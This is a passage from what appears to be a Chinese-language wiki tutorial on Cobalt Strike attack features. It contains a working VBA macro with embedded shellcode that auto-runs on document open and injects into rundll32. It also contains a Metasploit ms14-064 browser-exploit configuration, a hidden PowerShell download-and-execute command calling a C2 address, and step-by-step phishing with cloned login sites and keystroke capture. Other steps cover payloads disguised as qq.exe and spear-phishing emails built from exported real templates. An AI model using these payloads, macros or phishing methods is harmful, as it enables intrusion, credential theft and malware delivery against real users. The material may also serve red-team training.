class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,92,17,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,53,70,121,104,0,50,80,97,95,22,41,93,72,-68,23,25,-79,21,-58,45,-39,-82,48,-100,-118,-68,73,-49,-85,68,0,-113,-101,120,89,-123,63, _</span><br><span class="line">-29,90,-101,121,69,-115,57,47,114,24,76,106,-65,17,87,127,-26,-5,-31,12,-25,66,95,-58,-6,68,-81,121,-102,-128,-48,-35,-15,-63,-79,-74,-121,-9,-14,-79, _</span><br><span class="line">62,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,49,48,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,50,59,32,87,105,110,54,52,59,32,120,54,52,59,32,84,114, _</span><br><span class="line">105,100,101,110,116,47,54,46,48,59,32,65,118,97,110,116,32,66,114,111,119,115,101,114,41,13,10,0,-73,13,45,-79,112,-83,-23,-107,-3,-111,-103,89, _</span><br><span class="line">36,9,-76,-118,112,-67,-22,-128,44,-106,95,108,-37,-118,88,-92,7,106,51,114,-10,-13,47,43,46,90,-127,107,25,-25,-48,-10,41,-92,-2,52,47,46,17,44, _</span><br><span class="line">-32,103,-12,78,-62,4,-125,74,-111,117,55,-95,-86,-80,-26,6,-70,-21,-106,49,-126,37,-124,-10,63,-6,104,-9,-24,-66,-47,-112,75,-32,-71,-91,55,-78,29,0, _</span><br><span class="line">125,2,39,-99,-9,46,-91,24,93,-72,68,-15,-77,-118,44,102,46,88,41,-4,104,67,-97,92,-13,-86,40,-30,0,122,-89,-63,-85,-117,-61,106,-28,75,-78,-85, _</span><br><span class="line">2,-107,80,34,-82,-33,-51,-48,-19,-64,30,23,-94,-112,-62,-30,68,-81,76,58,-41,48,31,-22,-82,-54,-58,71,63,127,-73,-45,-23,64,15,110,9,-94,-9,-38, _</span><br><span class="line">124,-29,64,-104,-11,64,-115,28,-61,87,68,-30,127,1,-95,67,-46,124,98,57,-120,-40,-113,42,-64,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,48,46,50,53,49,46,48,46,51,53,0,25,105,-96,-115)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>然后打开word编辑器，点击视图，然后点击宏，随便输入一个宏名，选择宏的位置，点击创建。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/33.png"></p><p>删除掉原来的代码，然后将复制的宏代码粘贴进去。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/34.png"></p><p>然后将文件另存为可启动宏的docm文件。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/35.png"></p><p>然后目标用户开启宏功能，主机就会成功在CS中上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/36.png"></p><p>查看宏功能开启情况可以在：文件–&gt;选线–&gt;信任中心–&gt;信任中心设置–&gt;宏设置。</p><p>打开该文件后，目标主机成功上线，进程名为rundll32.exe。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/37.png"></p><h4 id="3-3-3-Payload-Generator"><a href="#3-3-3-Payload-Generator" class="headerlink" title="3.3.3 Payload Generator"></a>3.3.3 Payload Generator</h4><p>这个模块主要用于各种语言版本的shellcode，然后通过其他语言进行编译生成。</p><p>点击Attacks–&gt;Packages–&gt;Payload Generator</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/38.png"></p><p>这里演示一下PowerShell和PowerShell Command的使用方法。</p><p><strong>PowerShell的使用方法</strong></p><p>先通过generate生成一个payload.ps1文件。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/39.png"></p><p>在目标机器上，powershell下执行如下命令，执行如下命令可以执行该脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\payload.ps1</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\payload.ps1</span><br></pre></td></tr></table></figure><p><strong>PowerShell Command的使用方法</strong></p><p>先通过generator生成payload.txt文件。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/40.png"></p><p>在目标机器上，powershell下执行该命令。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/41.png"></p><h4 id="3-3-4-Windows-Executable"><a href="#3-3-4-Windows-Executable" class="headerlink" title="3.3.4 Windows Executable"></a>3.3.4 Windows Executable</h4><p>点击Attacks–&gt;Packages–&gt;Windows Executable。选择相应的监听器，若目标操作系统是64位的话，可以选择勾选x64。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/42.png"></p><p>通过Generate生成exe可执行文件，保存到指定路径。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/43.png"></p><p>将生成的文件上传到目标机器并执行，即可成功上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/44.png"></p><h4 id="3-3-5-Windows-Executable（S）"><a href="#3-3-5-Windows-Executable（S）" class="headerlink" title="3.3.5 Windows Executable（S）"></a>3.3.5 Windows Executable（S）</h4><p>这里再详细介绍一下Windows Executable与Windows Executable（S）的差别。</p><p>这两个模块直接用于生成可执行的exe文件或dll文件。Windows Executable是生成Stager类型的马，而Windows Executable（S）是生成Stageless类型的马。那Stager和Stageless有什么区别呢？</p><ul><li>Stager是分阶段传送Payload。就是我们生成的Stager马其实是一个小程序，用于从服务器端下载我们真正的shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。如果不需要分阶段的话，可以在C2的扩展文件里面把 host_stage选项设置为false。</li><li>而Stageless是完整的木马，后续不需要再向服务器端请求shellcode。所以使用这种方法生成的木马会比Stager生成的木马体积要大。但是这种木马有助于避免反溯源，因为如果开启了分阶段传送，任何人都能连接到你的C2服务器请求payload，并分析payload中的配置信息。在CobaltStrike4.0及以后的版本中，后渗透和横向移动绝大部分是使用的Stageless类型的木马。</li></ul><p>点击Attacks-&gt;Packages-&gt;Windows Executable。</p><p>选择对应的监听器和输出格式。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/45.png"></p><p>然后将生成的beacon.exe文件上传到目标机器上执行即可成功上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/46.png"></p><h3 id="3-4-用户驱动的Web交付攻击"><a href="#3-4-用户驱动的Web交付攻击" class="headerlink" title="3.4 用户驱动的Web交付攻击"></a>3.4 用户驱动的Web交付攻击</h3><p>用户驱动Web交付攻击User-Driven Web Drive-by Attacks功能打开位置：Attacks –&gt; Web Drive-by</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/25.png"></p><p>1、Java 签名 applet 攻击</p><p>java 签名 applet 攻击Java Signed Applet Attack会启动一个Web服务以提供自签名Java Applet的运行环境，浏览器会要求用户授予applet运行权限，如果用户同意则实现控制，但目前该攻击方法已过时。</p><p>2、Java 智能 Applet 攻击</p><p>Java 智能 Applet 攻击Java Smart Applet Attack会自动检测Java版本并利用已知的漏洞绕过安全沙箱，但CS官方称该攻击的实现已过时，在现在的环境中无效。</p><p>3、脚本化 Web 交付</p><p>脚本化 Web 交付Scripted Web Delivery 为payload提供web服务以便于下载和执行，类似于MSF的Script Web Delivery</p><p>4、托管文件</p><p>托管文件Host File通过Attacks –&gt; Web Drive-by –&gt; Host File进行配置，攻击者可以通过这个功能将文件上传到CS服务端上，从而进行文件托管。</p><p>如果想删除上传到CS服务端上的文件，可以到Attacks –&gt; Web Drive-by –&gt; Manage下进行删除。</p><p>如果想查看谁访问了这些文件，可以到View –&gt; Web Log下进行查看。</p><h3 id="3-5-钓鱼模块"><a href="#3-5-钓鱼模块" class="headerlink" title="3.5 钓鱼模块"></a>3.5 钓鱼模块</h3><h4 id="3-5-1-Manage"><a href="#3-5-1-Manage" class="headerlink" title="3.5.1 Manage"></a>3.5.1 Manage</h4><p>点击Attacks–&gt;Web Drive-by–&gt;Manage。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/47.png"></p><p>该模块可以查询CS服务端，现在能使用的模块代码。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/48.png"></p><h4 id="3-5-2-System-Profiler"><a href="#3-5-2-System-Profiler" class="headerlink" title="3.5.2 System Profiler"></a>3.5.2 System Profiler</h4><p>点击Attacks–&gt;Web Drive-by–&gt;System Profiler。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/20.png"></p><p>配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、View --&gt; Applications</span><br><span class="line">2、View --&gt; Web Log</span><br><span class="line">3、Cobalt Strike --&gt; Visualization --&gt; Target Table</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/21.png"></p><p>目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/22.png"></p><p>注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。</p><h4 id="3-5-3-Clone-Site"><a href="#3-5-3-Clone-Site" class="headerlink" title="3.5.3 Clone Site"></a>3.5.3 Clone Site</h4><p>点击Attacks–&gt;Web Drive-by–&gt;Clone Site。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/49.png"></p><p>填写需要克隆的网站url地址、本地的url地址、以及对应的端口号即可，这里记得要开启键盘记录。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/50.png"></p><p>点击Clone会生成一个链接。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/51.png"></p><p>访问此链接与克隆的网址完全一致。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/52.png"></p><p>将生成的链接发送给目标用户，若目标用户输入账号及密码进行登录，我们就可以在View–&gt;Web Log中得到用户输入的内容。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/53.png"></p><h4 id="3-5-4-Host-File"><a href="#3-5-4-Host-File" class="headerlink" title="3.5.4 Host File"></a>3.5.4 Host File</h4><p>点击Attacks–&gt;Web Drive-by–&gt;Host File。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/54.png"></p><p>上传文件artifact.exe，填入本地的URL、Host及端口即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/55.png"></p><p>点击launch生成下载链接。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/56.png"></p><p>将生成的下载链接发送给目标用户，若目标用户访问链接并运行了下载文件。目标主机就会成功上线。</p><h4 id="3-5-5-Clone-Site-Host-File"><a href="#3-5-5-Clone-Site-Host-File" class="headerlink" title="3.5.5 Clone Site + Host File"></a>3.5.5 Clone Site + Host File</h4><p>网站下载模块也可以与网站克隆模块进行组合使用，具体如下。</p><p>首先克隆一个网站，然后填入需要克隆的URL地址，然后在Attack中添加刚刚生成的下载链接即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/57.png"></p><p>点击Clone，会生成一个链接。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/58.png"></p><p>将生成的链接发送给目标用户，在目标用户访问时会提示是否下载qq.exe文件，当客户端下载并点击运行。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/59.png"></p><p>Cobalt Strike监听到有受害人主机就会成功上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/60.png"></p><h4 id="3-5-6-Clone-Site-MSF"><a href="#3-5-6-Clone-Site-MSF" class="headerlink" title="3.5.6 Clone Site + MSF"></a>3.5.6 Clone Site + MSF</h4><p>这里我们使用 metasploit中的ms14-064溢出漏洞与Cobalt Strik进行钓鱼攻击。具体步骤如下：</p><p>打开metasploit，使用ms14-064模块，并如下配置参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/ms14_064_ole_code_execution</span><br><span class="line">set SRVHOST 10.251.0.33</span><br><span class="line">set SRVPORT 8080</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.251.0.33</span><br><span class="line">set lport 6666</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure><p>最后运行exploit -j，-j 是指作为job开始运行，即在后台运行。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/61.png"></p><p>打开CS中的Clone Site模块，输入需要克隆的网站地址及本地的URL等信息。然后在Attack中填入刚刚生成的溢出利用代码。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/62.png"></p><p>然后通过Clone生成一个链接，将链接发送给目标用户。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/63.png"></p><p>若目标用户使用IE浏览器访问链接，便会返回meterpreter通道。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/64.png"></p><h4 id="3-5-7-Spear-Phish"><a href="#3-5-7-Spear-Phish" class="headerlink" title="3.5.7 Spear Phish"></a>3.5.7 Spear Phish</h4><p>Spear Phish又叫鱼叉式网络钓鱼（Spear phishing）指一种源于亚洲与东欧只针对特定目标进行攻击的网络钓鱼攻击。</p><p>由于鱼叉式网络钓鱼锁定之对象并非一般个人，而是特定公司、组织成员，故受窃信息已非一般网络钓鱼所窃取之个人资料，而是其他高度敏感性资料，如知识产权及商业机密。</p><p>网络钓鱼是指诱导人们连接那些黑客已经锁定的目标。这种攻击方法的成功率很高，也非常常见。点击链接、打开表格或者连接其他一些文件都会感染病毒。一次简单的点击相当于为攻击者开启了一扇电子门，这样他就可以接触到你的内部弱点了。因为你已经同意他进入，他能够接触弱点，然后挖掘信息和授权连接。</p><p>用CS进行钓鱼需要四个步骤：</p><p>1、创建一个目标清单</p><p>2、制作一个邮件模板或者使用之前制作好的模板</p><p>3、选择一个用来发送邮件的邮件服务器</p><p>4、发送邮件</p><p>点击Attacks–&gt;Spear Phish。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/65.png"></p><p>下面简单介绍一下需要配置的一些参数。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/66.png"></p><p>targets是要发送邮箱地址的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">123123@qq.com</span><br><span class="line">admin@qq.com</span><br><span class="line">admin@163.com</span><br></pre></td></tr></table></figure><p>template 是要发送邮件的模板，<strong>这个可以在个人邮箱中导出一个即可</strong></p><p>attachment 放入我们制作好的宏病毒</p><p>embed url 填写我们制作好的钓鱼网站</p><p>Mail Server 填写本地搭建或者网上公开使用的smtp服务器</p><p>Bounce To 模仿发件人，自己添写即可</p><p>首先先要创建一个文件，用于存放要进行钓鱼攻击的邮箱。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/67.png"></p><p>然后再看看怎么导出模板文件，具体步骤如下。</p><p>1.打开qq邮箱，选择需要导出的模板文件，这里我以<strong>【X情报社区】积分即将下线提醒</strong>的邮件为例。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/68.png"></p><p>2.选择导出为eml文件。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/69.png"></p><p>3.然后将导出的文件保存到指定路径即可。</p><p>4.开启SMTP服务器</p><p>再导出模板文件以后，我们需要先开启SMTP服务器，这里以网易邮箱为例。在<a href="https://mail.163.com/%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA163%E9%82%AE%E7%AE%B1%E3%80%82">https://mail.163.com/注册一个163邮箱。</a></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/70.png"></p><p>登陆邮箱，开启smtp服务。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/75.png"></p><p>在开启smtp服务时，系统会要求你发送一条短信。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/76.png"></p><p>在发送完短信以后，系统会给我们一个授权密码，用于在第三方服务器上使用smtp服务。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/77.png"></p><p>最后通过Clone Site创建一个钓鱼网站，进行钓鱼攻击，这里以克隆tom邮箱为例。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/78.png"></p><p>准备就绪，现在开始制作钓鱼邮件，填入需要进行填写的内容。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/79.png"></p><p>查看send email，可以发现邮件成功发送。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/80.png"></p><p>这时候打开邮箱，也可以看到成功收到了邮件。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/81.png"></p><p>这时候若目标用户下载附件并打开，且在office开启了宏功能。主机就会成功上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/82.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/83.png"></p><p>在用户点击任意链接后，就会跳转到我们所创建的钓鱼网站，并会提示是否下载qq.exe。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/84.png"></p><p>若用户点击保存并运行，主机也会成功上线。而且如果目标主机在登陆框中输入了用户名密码，输入的内容也将被我们所得到。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/85.png"></p><h4 id="3-5-8-Scripted-Web-Delivery（S）"><a href="#3-5-8-Scripted-Web-Delivery（S）" class="headerlink" title="3.5.8 Scripted Web Delivery（S）"></a>3.5.8 Scripted Web Delivery（S）</h4><p>点击Attacks–&gt;Web Drive-by–&gt;Scripted Web Delivery（S）</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/71.png"></p><p>设置监听器，选择需要使用的payload类型，这里以powershell为例。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/72.png"></p><p>点击Launch后，会生成一段powershell利用代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.251.0.35:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/73.png"></p><p>在目标机器上执行这段代码，就会从服务器上下载后门文件，主机就会成功上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/74.png"></p><h2 